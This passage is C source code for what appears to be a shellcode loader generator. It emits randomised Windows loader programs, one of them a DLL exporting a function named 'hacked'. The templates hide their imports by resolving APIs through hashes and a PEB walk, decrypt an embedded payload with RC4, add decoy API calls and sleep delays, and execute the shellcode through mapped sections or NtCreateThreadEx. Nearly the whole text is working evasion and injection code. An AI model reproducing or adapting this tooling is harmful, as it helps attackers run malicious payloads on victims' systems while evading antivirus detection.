        "#define %s           0xF20D7F2A\n"
        "#define %s           0xA4E3F108\n"
        "#define %s           0xB9D893EC\n\n"
        "void %s(char * data, size_t data_len, char * key, size_t key_len) {\n"
        "\tint j;\n"
        "\n\tj = 0;\n"
        "\tfor (int i = 0; i < data_len; i++) {\n"
        "\t\tif (j == key_len - 1) j = 0;\n"
        "\n\t\tdata[i] = data[i] ^ key[j];\n"
        "\t\tj++;\n"
        "\t}\n"
        "}\n"
        "char xkey[] = \"%s\";\n"
        "char p03[] = {%s};\n"
        "unsigned char %s[] = { %s };\n"
        "unsigned char %s[] = { %s };\n"
        "#define HINT_BYTE 0x%02X\n\n"
        "#define INITIAL_HASH 4338\n"
        "#define INITIAL_SEED 7\n"
        "DWORD HashStringDjb2A(_In_ LPCSTR String)\n"
        "{\n"
        "    ULONG Hash = INITIAL_HASH;\n"
        "    INT c;\n"
        "    while (c = *String++)\n"
        "        Hash = ((Hash << INITIAL_SEED) + Hash) + c;\n"
        "    return Hash;\n"
        "}\n"
        "#define HASHA(API) (HashStringDjb2A((PCHAR) API))\n\n"
        "FARPROC %s(HMODULE hModule, DWORD dwApiNameHash) {\n"
        "    if (hModule == NULL || dwApiNameHash == 0)\n"
        "        return NULL;\n"
        "    PBYTE pBase = (PBYTE)hModule;\n"
        "    PIMAGE_DOS_HEADER           pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;\n"
        "    if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE)\n"
        "        return NULL;\n"
        "    PIMAGE_NT_HEADERS           pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);\n"
        "    if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)\n"
        "        return NULL;\n"
        "    IMAGE_OPTIONAL_HEADER       ImgOptHdr = pImgNtHdrs->OptionalHeader;\n"
        "    PIMAGE_EXPORT_DIRECTORY     pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);\n"
        "    PDWORD                      FunctionNameArray = (PDWORD)(pBase + pImgExportDir->AddressOfNames);\n"
        "    PDWORD                      FunctionAddressArray = (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);\n"
        "    PWORD                       FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);\n"
        "    for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++) {\n"
        "        CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);\n"
        "        PVOID   pFunctionAddress = (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);\n"
        "        if (dwApiNameHash == HASHA(pFunctionName)) {\n"
        "            return pFunctionAddress;\n"
        "        }\n"
        "    }\n"
        "    return NULL;\n"
        "}\n"
        "HMODULE %s(DWORD dwModuleNameHash) {\n"
        "    if (dwModuleNameHash == 0)\n"
        "        return NULL;\n"
        "#ifdef _WIN64\n"
        "    PPEB                    pPeb = (PEB*)(__readgsqword(0x60));\n"
        "#elif _WIN32\n"
        "    PPEB                    pPeb = (PEB*)(__readfsdword(0x30));\n"
        "#endif\n"
        "    PPEB_LDR_DATA           pLdr = (PPEB_LDR_DATA)(pPeb->Ldr);\n"
        "    PLDR_DATA_TABLE_ENTRY   pDte = (PLDR_DATA_TABLE_ENTRY)(pLdr->InMemoryOrderModuleList.Flink);\n"
        "    while (pDte) {\n"
        "        if (pDte->FullDllName.Length != 0 && pDte->FullDllName.Length < MAX_PATH) {\n"
        "            CHAR UpperCaseDllName[MAX_PATH];\n"
        "            DWORD i = 0;\n"
        "            while (pDte->FullDllName.Buffer[i]) {\n"
        "                UpperCaseDllName[i] = (CHAR)%s(pDte->FullDllName.Buffer[i]);\n"
        "                i++;\n"
        "            }\n"
        "            UpperCaseDllName[i] = '\\0';\n"
        "            if (HASHA(UpperCaseDllName) == dwModuleNameHash)\n"
        "                return pDte->Reserved2[0];\n"
        "        }\n"
        "        else {\n"
        "            break;\n"
        "        }\n"
        "        pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);\n"
        "    }\n"
        "    return NULL;\n"
        "}\n"
        "BOOL Ruard(IN BYTE HintByte, IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {\n"
        "    BYTE            b = 0;\n"
        "    INT             i = 0;\n"
        "    PBYTE pRealKey = (PBYTE)my_malloc(dwRc4KeySize);\n"
        "    HMODULE kernel = %s(%s);\n"
        "    %s p%s = (%s)%s(kernel, %s);\n"
        "    %s p%s = (%s)%s(kernel, %s);\n"
        "    if (!pRealKey)\n"
        "        return 0;\n"
        "    while (1) {\n"
        "        if (((pRc4Key[0] ^ b)) == HintByte)\n"
        "            break;\n"
        "        else\n"
        "            b++;\n"
        "    }\n"
        "    for (int i = 0; i < dwRc4KeySize; i++) {\n"
        "        pRealKey[i] = (BYTE)((pRc4Key[i] ^ b) - i);\n"
        "    }\n"
        "    USTRING Key = { .Buffer = pRealKey, .Length = dwRc4KeySize, .MaximumLength = dwRc4KeySize },\n"
        "        Img = { .Buffer = pPayloadData, .Length = sPayloadSize, .MaximumLength = sPayloadSize };\n"
        "    char pav[] = { 'A','d','v','a','p','i','3','2','\\0' };\n"
        "    %s((char*)p03, sizeof(p03), xkey, sizeof(xkey));\n"
        "    %s p%s = (%s)p%s(p%s(pav), p03);\n"
        "    p%s(&Img, &Key);\n"
        "    return TRUE;\n"
        "}\n"
        "BOOL %s() {\n"
        "    HANDLE shandle = NULL;\n"
        "    HANDLE thandle = NULL;\n"
        "    PVOID address = NULL;\n"
        "    SIZE_T sViewSize = 0;\n"
        "    LARGE_INTEGER MaximumSize = { .QuadPart = sizeof(%s) };\n"
        "    LARGE_INTEGER timeout;\n"
        "    timeout.QuadPart = -500000;\n"
        "    HMODULE nlt = %s(%s);\n"
        "    %s p%s = (%s)%s(nlt, %s);\n"
        "    %s p%s = (%s)%s(nlt, %s);\n"
        "    %s p%s = (%s)%s(nlt, %s);\n"
        "    %s p%s = (%s)%s(nlt, %s);\n"
        "    %s p%s = (%s)%s(nlt, %s);\n"
        "    %s p%s = (%s)%s(nlt, %s);\n"
        "    p%s(&shandle, SECTION_ALL_ACCESS, NULL, &MaximumSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);\n"
        "    p%s(shandle, (HANDLE)-1, &address, 0, 0, NULL, &sViewSize, ViewShare, 0, PAGE_EXECUTE_READWRITE);\n"
        "    memcpy(address, %s, sizeof(%s));\n"
        "    Ruard(HINT_BYTE, %s, address, sizeof(%s), sizeof(%s));\n"
        "    p%s(&thandle, THREAD_ALL_ACCESS, NULL, (HANDLE)-1, address, NULL, 0, 0, 0, 0, NULL);\n"
        "    p%s(thandle, FALSE, &timeout);\n"
        "    p%s(thandle);\n"
        "    p%s((HANDLE)-1, address);\n"
        "    p%s(shandle);\n"
        "}\n"
        "VOID %s(IN FLOAT fMinutes) {\n"
        "    HMODULE ntdll = %s(%s);\n"
        "    %s p%s = (%s)%s(ntdll, %s);\n"
        "    DWORD dwMilliSeconds = (DWORD)(fMinutes * 60000.0f);\n"
        "    LONGLONG Delay = (LONGLONG)dwMilliSeconds * -10000LL;\n"
        "    LARGE_INTEGER DelayInterval = { .QuadPart = Delay };\n"
        "    p%s(FALSE, &DelayInterval);\n"
        "}\n"
        "VOID run() {\n"
        "    %s();\n"
        "}\n"
        "extern __declspec(dllexport) int hacked() {\n"
        "    run();\n"
        "}\n"
        "BOOL APIENTRY DllMain(HMODULE ,  DWORD  ul_reason_for_call, LPVOID ) {\n"
        "    switch (ul_reason_for_call)  {\n"
        "    case DLL_PROCESS_ATTACH:\n"
        "    case DLL_PROCESS_DETACH:\n"
        "    case DLL_THREAD_ATTACH:\n"
        "    case DLL_THREAD_DETACH:\n"
        "        break;\n"
        "    }\n"
        "    return TRUE;\n"
        "}\n",
        SystemFunction032_typedef,
        LoadLibraryA_typedef,
        GetProcAddress_typedef,
        NtCreateSection_typedef,
        NtMapViewOfSection_typedef,
        UnmapViewOfSection_typedef,
        NtCreateThreadEx_typedef,
        NtWaitForSingleObject_typedef,
        NtClose_typedef,
        NtDelayExecution_typedef,
        random_toUpper_name,
        ntdll_hash_name,
        kernel32_hash_name,
        ntcreatesection_hash_name,
        ntmapviewofsection_hash_name,
        ntunmapviewofsection_hash_name,
        ntwaitforsingleobject_hash_name,
        ntcreatethreadex_hash_name,
        ntdelayexecution_hash_name,
        ntclose_hash_name,
        loadlibrarya_hash_name,
        getprocaddress_hash_name,
        random_obf_func,
        xkey, obfuscated_fun, random_payload_name, shellcodeArray, random_key_name, keyArray, hint,
        random_getproc_name,
        random_getmodule_name,
        random_toUpper_name,
        random_getmodule_name, kernel32_hash_name,
        LoadLibraryA_typedef, pLoadLibraryA_name, LoadLibraryA_typedef, random_getproc_name, loadlibrarya_hash_name,
        GetProcAddress_typedef, pGetProcAddress_name, GetProcAddress_typedef, random_getproc_name, getprocaddress_hash_name,
        random_obf_func,
        SystemFunction032_typedef, pSystemFunction032_name, SystemFunction032_typedef, pGetProcAddress_name, pLoadLibraryA_name,
        pSystemFunction032_name,
        random_inject_func,
        random_payload_name,
        random_getmodule_name, ntdll_hash_name,
        NtCreateSection_typedef, pNtCreateSection_name, NtCreateSection_typedef, random_getproc_name, ntcreatesection_hash_name,
        NtMapViewOfSection_typedef, pNtMapViewOfSection_name, NtMapViewOfSection_typedef, random_getproc_name, ntmapviewofsection_hash_name,
        UnmapViewOfSection_typedef, pUnmapViewOfSection_name, UnmapViewOfSection_typedef, random_getproc_name, ntunmapviewofsection_hash_name,
        NtCreateThreadEx_typedef, pNtCreateThreadEx_name, NtCreateThreadEx_typedef, random_getproc_name, ntcreatethreadex_hash_name,
        NtWaitForSingleObject_typedef, pNtWaitForSingleObject_name, NtWaitForSingleObject_typedef, random_getproc_name, ntwaitforsingleobject_hash_name,
        NtClose_typedef, pNtClose_name, NtClose_typedef, random_getproc_name, ntclose_hash_name,
        pNtCreateSection_name,
        pNtMapViewOfSection_name,
        random_payload_name, random_payload_name,
        random_key_name, random_key_name, random_payload_name,
        pNtCreateThreadEx_name,
        pNtWaitForSingleObject_name,
        pNtClose_name,
        pUnmapViewOfSection_name,
        pNtClose_name,
        random_delay_func,
        random_getmodule_name, ntdll_hash_name,
        NtDelayExecution_typedef, pNtDelayExecution_name, NtDelayExecution_typedef, random_getproc_name, ntdelayexecution_hash_name,
        pNtDelayExecution_name,
        random_inject_func
    );
}
void obf_5_process_injection(char* payload, size_t size, PBYTE shellcode, DWORD shellcodeSize, PBYTE key, DWORD keySize, byte hint) {
    // Seed random number generator
    srand((unsigned int)time(NULL));

    // Random name generation for variables and functions
    char random_toUpper_name[10], random_seed_name[10], random_helper_name[10];
    char random_obf_func[10], random_delay_func[10], random_inject_func[10];
    char random_iatcamouflage_name[10];

    generate_random_string(random_toUpper_name, sizeof(random_toUpper_name));
    generate_random_string(random_seed_name, sizeof(random_seed_name));
    generate_random_string(random_helper_name, sizeof(random_helper_name));
    generate_random_string(random_obf_func, sizeof(random_obf_func));
    generate_random_string(random_delay_func, sizeof(random_delay_func));
    generate_random_string(random_inject_func, sizeof(random_inject_func));
    generate_random_string(random_iatcamouflage_name, sizeof(random_iatcamouflage_name));

    // Random names for GetModuleHandleH, GetProcAddressH
    char random_getmodule_name[15], random_getproc_name[15];

    generate_random_string(random_getmodule_name, sizeof(random_getmodule_name));
    generate_random_string(random_getproc_name, sizeof(random_getproc_name));

    // Random pointer names
    char pSystemFunction032_name[9], pLoadLibraryA_name[9], pGetProcAddress_name[9];
    char pNtAllocateVirtualMemory_name[9], pNtProtectVirtualMemory_name[9];
    char pNtCreateThreadEx_name[9], pNtWaitForSingleObject_name[9], pNtClose_name[9];
    char pNtDelayExecution_name[9];

    generate_random_string(pSystemFunction032_name, sizeof(pSystemFunction032_name));
    generate_random_string(pLoadLibraryA_name, sizeof(pLoadLibraryA_name));
    generate_random_string(pGetProcAddress_name, sizeof(pGetProcAddress_name));
    generate_random_string(pNtAllocateVirtualMemory_name, sizeof(pNtAllocateVirtualMemory_name));
    generate_random_string(pNtProtectVirtualMemory_name, sizeof(pNtProtectVirtualMemory_name));
    generate_random_string(pNtCreateThreadEx_name, sizeof(pNtCreateThreadEx_name));
    generate_random_string(pNtWaitForSingleObject_name, sizeof(pNtWaitForSingleObject_name));
    generate_random_string(pNtClose_name, sizeof(pNtClose_name));
    generate_random_string(pNtDelayExecution_name, sizeof(pNtDelayExecution_name));

    // Random names for hashing definitions
    char ntdll_hash_name[11], kernel32_hash_name[11], ntallocatevirtualmemory_hash_name[11];
    char ntprotectvirtualmemory_hash_name[12], ntwaitforsingleobject_hash_name[12];
    char ntcreatethreadex_hash_name[11], ntdelayexecution_hash_name[11], ntclose_hash_name[11];
    char loadlibrarya_hash_name[11], getprocaddress_hash_name[11];

    generate_random_string(ntdll_hash_name, sizeof(ntdll_hash_name));
    generate_random_string(kernel32_hash_name, sizeof(kernel32_hash_name));
    generate_random_string(ntallocatevirtualmemory_hash_name, sizeof(ntallocatevirtualmemory_hash_name));
    generate_random_string(ntprotectvirtualmemory_hash_name, sizeof(ntprotectvirtualmemory_hash_name));
    generate_random_string(ntwaitforsingleobject_hash_name, sizeof(ntwaitforsingleobject_hash_name));
    generate_random_string(ntcreatethreadex_hash_name, sizeof(ntcreatethreadex_hash_name));
    generate_random_string(ntdelayexecution_hash_name, sizeof(ntdelayexecution_hash_name));
    generate_random_string(ntclose_hash_name, sizeof(ntclose_hash_name));
    generate_random_string(loadlibrarya_hash_name, sizeof(loadlibrarya_hash_name));
    generate_random_string(getprocaddress_hash_name, sizeof(getprocaddress_hash_name));

    // Random typedef names
    char SystemFunction032_typedef[12], LoadLibraryA_typedef[12], GetProcAddress_typedef[12];
    char NtAllocateVirtualMemory_typedef[12], NtProtectVirtualMemory_typedef[12];
    char NtCreateThreadEx_typedef[12], NtWaitForSingleObject_typedef[12], NtClose_typedef[12];
    char NtDelayExecution_typedef[12];

    generate_random_string(SystemFunction032_typedef, sizeof(SystemFunction032_typedef));
    generate_random_string(LoadLibraryA_typedef, sizeof(LoadLibraryA_typedef));
    generate_random_string(GetProcAddress_typedef, sizeof(GetProcAddress_typedef));
    generate_random_string(NtAllocateVirtualMemory_typedef, sizeof(NtAllocateVirtualMemory_typedef));
    generate_random_string(NtProtectVirtualMemory_typedef, sizeof(NtProtectVirtualMemory_typedef));
    generate_random_string(NtCreateThreadEx_typedef, sizeof(NtCreateThreadEx_typedef));
    generate_random_string(NtWaitForSingleObject_typedef, sizeof(NtWaitForSingleObject_typedef));
    generate_random_string(NtClose_typedef, sizeof(NtClose_typedef));
    generate_random_string(NtDelayExecution_typedef, sizeof(NtDelayExecution_typedef));

    // Random names for EncryptedPayload and ProtectedKey
    char random_payload_name[15], random_key_name[15];

    generate_random_string(random_payload_name, sizeof(random_payload_name));
    generate_random_string(random_key_name, sizeof(random_key_name));

    // Convert shellcode and key to hex string representation
    unsigned char shellcodeArray[8096] = { 0 };
    unsigned char keyArray[5012] = { 0 };
    creatHexArray(shellcodeArray, shellcode, shellcodeSize, sizeof(shellcodeArray));
    creatHexArray(keyArray, key, keySize, sizeof(keyArray));

    char* xkey = generate_random_string_key();
    char* obfuscated_fun = obf("SystemFunction032", xkey);

    snprintf(payload, size,
        "#include <windows.h>\n"
        "#include <winternl.h>\n\n"
        "typedef struct {\n"
        "    DWORD Length;\n"
        "    DWORD MaximumLength;\n"
        "    PVOID Buffer;\n"
        "} USTRING;\n"
        "typedef NTSTATUS(NTAPI* %s)(USTRING* Img, USTRING* Key);\n"
        "typedef HMODULE(NTAPI* %s)(LPCSTR);\n"
        "typedef FARPROC(NTAPI* %s)(HMODULE, LPCSTR);\n"
        "typedef enum _SECTION_INHERIT {\n"
        "    ViewShare = 1,\n"
        "    ViewUnmap = 2\n"
        "} SECTION_INHERIT, * PSECTION_INHERIT;\n"
        "typedef struct _PS_ATTRIBUTE {\n"
        "    ULONG Attribute;\n"
        "    SIZE_T Size;\n"
        "    union {\n"
        "        ULONG Value;\n"
        "        PVOID ValuePtr;\n"
        "    } ul;\n"
        "    PSIZE_T ReturnLength;\n"
        "} PS_ATTRIBUTE, * PPS_ATTRIBUTE;\n"
        "typedef struct _PS_ATTRIBUTE_LIST {\n"
        "    SIZE_T  TotalLength;\n"
        "    PS_ATTRIBUTE Attributes[1];\n"
        "} PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST;\n"
        "typedef NTSTATUS(NTAPI* %s)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);\n"
        "typedef NTSTATUS(NTAPI* %s)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);\n"
        "typedef NTSTATUS(NTAPI* %s)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PPS_ATTRIBUTE_LIST);\n"
        "typedef NTSTATUS(NTAPI* %s)(HANDLE, BOOLEAN, PLARGE_INTEGER);\n"
        "typedef NTSTATUS(NTAPI* %s)(HANDLE);\n"
        "typedef NTSTATUS(NTAPI* %s)(BOOLEAN, PLARGE_INTEGER);\n\n"
        "CHAR %s(CHAR C)\n"
        "{\n"
        "    if (C >= 'a' && C <= 'z')\n"
        "        return C - 'a' + 'A';\n"
        "    return C;\n"
        "}\n\n"
        "void* memcpy(void* dest, const void* src, size_t n) {\n"
        "    char* d = (char*)dest;\n"
        "    const char* s = (char*)src;\n"
        "    for (size_t i = 0; i < n; i++) {\n"
        "        d[i] = s[i];\n"
        "    }\n"
        "    return dest;\n"
        "}\n\n"
        "int %s(void)\n"
        "{\n"
        "    return '0' * -40271 +\n"
        "        __TIME__[7] * 1 +\n"
        "        __TIME__[6] * 10 +\n"
        "        __TIME__[4] * 60 +\n"
        "        __TIME__[3] * 600 +\n"
        "        __TIME__[1] * 3600 +\n"
        "        __TIME__[0] * 36000;\n"
        "}\n"
        "PVOID %s(PVOID* ppAddress) {\n"
        "    PVOID pAddress = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0xFF);\n"
        "    if (!pAddress)\n"
        "        return NULL;\n"
        "    *(int*)pAddress = %s() %% 0xFF;\n"
        "    *ppAddress = pAddress;\n"
        "    return pAddress;\n"
        "}\n"
        "VOID %s() {\n"
        "    PVOID       pAddress = NULL;\n"
        "    int* A = (int*)%s(&pAddress);\n"
        "    if (*A > 350) {\n"
        "        unsigned __int64 i = MessageBoxA(0, 0, 0, 0);\n"
        "        i = GetLastError();\n"
        "        i = SetCriticalSectionSpinCount(0, 0);\n"
        "        i = GetWindowContextHelpId(0);\n"
        "        i = GetWindowLongPtrW(0, 0);\n"
        "        i = RegisterClassW(0);\n"
        "        i = IsWindowVisible(0);\n"
        "        i = ConvertDefaultLocale(0);\n"
        "        i = MultiByteToWideChar(0, 0, 0, 0, 0, 0);\n"
        "        i = IsDialogMessageW(0, 0);\n"
        "    }\n"
        "    HeapFree(GetProcessHeap(), 0, pAddress);\n"
        "}\n\n"
        "#define %s               0x5251037A\n"
        "#define %s               0xA5E086A2\n"
        "#define %s           0x0B37D3B9\n"
        "#define %s           0x504D6BF5\n"
        "#define %s           0xCB42C5A9\n"
        "#define %s           0x61D8C71D\n"
        "#define %s           0x1236E2D7\n"
        "#define %s           0xF20D7F2A\n"
        "#define %s           0xA4E3F108\n"
        "#define %s           0xB9D893EC\n\n"
        "void %s(char * data, size_t data_len, char * key, size_t key_len) {\n"
        "\tint j;\n"
        "\n\tj = 0;\n"
        "\tfor (int i = 0; i < data_len; i++) {\n"
        "\t\tif (j == key_len - 1) j = 0;\n"
        "\n\t\tdata[i] = data[i] ^ key[j];\n"
        "\t\tj++;\n"
        "\t}\n"
        "}\n"
        "char xkey[] = \"%s\";\n"
        "char pnct[] = {%s};\n"
        "unsigned char %s[] = { %s };\n"
        "unsigned char %s[] = { %s };\n"
        "#define HINT_BYTE 0x%02X\n\n"
        "#define INITIAL_HASH 4338\n"
        "#define INITIAL_SEED 7\n"
        "DWORD HashStringDjb2A(_In_ LPCSTR String)\n"
        "{\n"
        "    ULONG Hash = INITIAL_HASH;\n"
        "    INT c;\n"
        "    while (c = *String++)\n"
        "        Hash = ((Hash << INITIAL_SEED) + Hash) + c;\n"
        "    return Hash;\n"
        "}\n"
        "#define HASHA(API) (HashStringDjb2A((PCHAR) API))\n\n"
        "FARPROC %s(HMODULE hModule, DWORD dwApiNameHash) {\n"
        "    if (hModule == NULL || dwApiNameHash == 0)\n"
        "        return NULL;\n"
        "    PBYTE pBase = (PBYTE)hModule;\n"
        "    PIMAGE_DOS_HEADER           pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;\n"
        "    if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE)\n"
        "        return NULL;\n"
        "    PIMAGE_NT_HEADERS           pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);\n"
        "    if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)\n"
        "        return NULL;\n"
        "    IMAGE_OPTIONAL_HEADER       ImgOptHdr = pImgNtHdrs->OptionalHeader;\n"
        "    PIMAGE_EXPORT_DIRECTORY     pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);\n"
        "    PDWORD                      FunctionNameArray = (PDWORD)(pBase + pImgExportDir->AddressOfNames);\n"
        "    PDWORD                      FunctionAddressArray = (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);\n"
        "    PWORD                       FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);\n"
        "    for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++) {\n"
        "        CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);\n"
        "        PVOID   pFunctionAddress = (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);\n"
        "        if (dwApiNameHash == HASHA(pFunctionName)) {\n"
        "            return pFunctionAddress;\n"
        "        }\n"
        "    }\n"
        "    return NULL;\n"
        "}\n"
        "HMODULE %s(DWORD dwModuleNameHash) {\n"
        "    if (dwModuleNameHash == 0)\n"
        "        return NULL;\n"
        "#ifdef _WIN64\n"
        "    PPEB                    pPeb = (PEB*)(__readgsqword(0x60));\n"
        "#elif _WIN32\n"
        "    PPEB                    pPeb = (PEB*)(__readfsdword(0x30));\n"
        "#endif\n"
        "    PPEB_LDR_DATA           pLdr = (PPEB_LDR_DATA)(pPeb->Ldr);\n"
        "    PLDR_DATA_TABLE_ENTRY   pDte = (PLDR_DATA_TABLE_ENTRY)(pLdr->InMemoryOrderModuleList.Flink);\n"
        "    while (pDte) {\n"
        "        if (pDte->FullDllName.Length != 0 && pDte->FullDllName.Length < MAX_PATH) {\n"
        "            CHAR UpperCaseDllName[MAX_PATH];\n"
        "            DWORD i = 0;\n"
        "            while (pDte->FullDllName.Buffer[i]) {\n"
        "                UpperCaseDllName[i] = (CHAR)%s(pDte->FullDllName.Buffer[i]);\n"
        "                i++;\n"
        "            }\n"
        "            UpperCaseDllName[i] = '\\0';\n"
        "            if (HASHA(UpperCaseDllName) == dwModuleNameHash)\n"
        "                return pDte->Reserved2[0];\n"
        "        }\n"
        "        else {\n"
        "            break;\n"
        "        }\n"
        "        pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);\n"
        "    }\n"
        "    return NULL;\n"
        "}\n"
        "BOOL Rua(IN BYTE HintByte, IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {\n"
        "    BYTE            b = 0;\n"
        "    INT             i = 0;\n"
        "    PBYTE pRealKey = (PBYTE)HeapAlloc(GetProcessHeap(), 0, dwRc4KeySize);\n"
        "    HMODULE kernel = %s(%s);\n"
        "    %s p%s = (%s)%s(kernel, %s);\n"
        "    %s p%s = (%s)%s(kernel, %s);\n"
        "    if (!pRealKey)\n"
        "        return 0;\n"
        "    while (1) {\n"
        "        if (((pRc4Key[0] ^ b)) == HintByte)\n"
        "            break;\n"
        "        else\n"
        "            b++;\n"
        "    }\n"
        "    for (int i = 0; i < dwRc4KeySize; i++) {\n"
        "        pRealKey[i] = (BYTE)((pRc4Key[i] ^ b) - i);\n"
        "    }\n"
        "    USTRING Key = { .Buffer = pRealKey, .Length = dwRc4KeySize, .MaximumLength = dwRc4KeySize },\n"
        "        Img = { .Buffer = pPayloadData, .Length = sPayloadSize, .MaximumLength = sPayloadSize };\n"
        "    char dpi[] = { 'A','d','v','a','p','i','3','2','\\0' };\n"
        "    %s((char*)pnct, sizeof(pnct), xkey, sizeof(xkey));\n"
        "    %s p%s = (%s)p%s(p%s(dpi), pnct);\n"
        "    p%s(&Img, &Key);\n"
        "    return TRUE;\n"
        "}\n"
        "VOID %s() {\n"
        "    HANDLE hThread = NULL;\n"
        "    PVOID pAddress = NULL;\n"
        "    DWORD old = 0;\n"
        "    SIZE_T sPayloadSize = sizeof(%s);\n"
        "    LARGE_INTEGER timeout;\n"
        "    timeout.QuadPart = -500000;\n"
        "    HMODULE tll = %s(%s);\n"
        "    %s p%s = (%s)%s(tll, %s);\n"
        "    %s p%s = (%s)%s(tll, %s);\n"
        "    %s p%s = (%s)%s(tll, %s);\n"
        "    %s p%s = (%s)%s(tll, %s);\n"
        "    %s p%s = (%s)%s(tll, %s);\n"
        "    p%s((HANDLE)-1, &pAddress, 0, &sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\n"
        "    memcpy(pAddress, %s, sPayloadSize);\n"
        "    Rua(HINT_BYTE, %s, pAddress, sizeof(%s), sPayloadSize);\n"
        "    p%s((HANDLE)-1, &pAddress, &sPayloadSize, PAGE_EXECUTE_READ, &old);\n"
        "    p%s(&hThread, THREAD_ALL_ACCESS, NULL, (HANDLE)-1, pAddress, NULL, 0, 0, 0, 0, 0);\n"
        "    p%s(hThread, FALSE, &timeout);\n"
        "    p%s(hThread);\n"
        "}\n"
        "VOID %s(IN FLOAT fMinutes) {\n"
        "    HMODULE ntdll = %s(%s);\n"
        "    %s p%s = (%s)%s(ntdll, %s);\n"
        "    DWORD dwMilliSeconds = (DWORD)(fMinutes * 60000.0f);\n"
        "    LONGLONG Delay = (LONGLONG)dwMilliSeconds * -10000LL;\n"
        "    LARGE_INTEGER DelayInterval = { .QuadPart = Delay };\n"
        "    p%s(FALSE, &DelayInterval);\n"
        "}\n"
        "int WINAPI WinMain(HINSTANCE , HINSTANCE , LPSTR , int ) {\n"
        "    %s();\n"
        "    return 0;\n"
        "}\n",
        SystemFunction032_typedef,
        LoadLibraryA_typedef,
        GetProcAddress_typedef,
        NtAllocateVirtualMemory_typedef,
        NtProtectVirtualMemory_typedef,
        NtCreateThreadEx_typedef,
        NtWaitForSingleObject_typedef,
        NtClose_typedef,
        NtDelayExecution_typedef,
        random_toUpper_name,
        random_seed_name,
        random_helper_name,
        random_seed_name,
        random_iatcamouflage_name,
        random_helper_name,
        ntdll_hash_name,
        kernel32_hash_name,
        ntallocatevirtualmemory_hash_name,
        ntprotectvirtualmemory_hash_name,
        ntwaitforsingleobject_hash_name,
        ntcreatethreadex_hash_name,
        ntdelayexecution_hash_name,
        ntclose_hash_name,
        loadlibrarya_hash_name,
        getprocaddress_hash_name,
        random_obf_func,
        xkey, obfuscated_fun, random_payload_name, shellcodeArray, random_key_name, keyArray, hint,
        random_getproc_name,
        random_getmodule_name,
        random_toUpper_name,
        random_getmodule_name, kernel32_hash_name,
        LoadLibraryA_typedef, pLoadLibraryA_name, LoadLibraryA_typedef, random_getproc_name, loadlibrarya_hash_name,
        GetProcAddress_typedef, pGetProcAddress_name, GetProcAddress_typedef, random_getproc_name, getprocaddress_hash_name,
        random_obf_func,
        SystemFunction032_typedef, pSystemFunction032_name, SystemFunction032_typedef, pGetProcAddress_name, pLoadLibraryA_name,
        pSystemFunction032_name,
        random_inject_func,
        random_payload_name,
        random_getmodule_name, ntdll_hash_name,
        NtAllocateVirtualMemory_typedef, pNtAllocateVirtualMemory_name, NtAllocateVirtualMemory_typedef, random_getproc_name, ntallocatevirtualmemory_hash_name,
        NtProtectVirtualMemory_typedef, pNtProtectVirtualMemory_name, NtProtectVirtualMemory_typedef, random_getproc_name, ntprotectvirtualmemory_hash_name,
        NtCreateThreadEx_typedef, pNtCreateThreadEx_name, NtCreateThreadEx_typedef, random_getproc_name, ntcreatethreadex_hash_name,
        NtWaitForSingleObject_typedef, pNtWaitForSingleObject_name, NtWaitForSingleObject_typedef, random_getproc_name, ntwaitforsingleobject_hash_name,
        NtClose_typedef, pNtClose_name, NtClose_typedef, random_getproc_name, ntclose_hash_name,
        pNtAllocateVirtualMemory_name,
        random_payload_name, random_key_name, random_key_name,
        pNtProtectVirtualMemory_name,
        pNtCreateThreadEx_name,
        pNtWaitForSingleObject_name,
        pNtClose_name,
        random_delay_func,
        random_getmodule_name, ntdll_hash_name,
        NtDelayExecution_typedef, pNtDelayExecution_name, NtDelayExecution_typedef, random_getproc_name, ntdelayexecution_hash_name,
        pNtDelayExecution_name,
        random_inject_func
    );
}
void obf_5_process_injection_dll(char* payload, size_t size, PBYTE shellcode, DWORD shellcodeSize, PBYTE key, DWORD keySize, byte hint) {
    // Seed random number generator
    srand((unsigned int)time(NULL));

    // Random name generation for variables and functions
    char random_toUpper_name[10], random_seed_name[10], random_helper_name[10];
    char random_obf_func[10], random_delay_func[10], random_inject_func[10];
    char random_iatcamouflage_name[10];
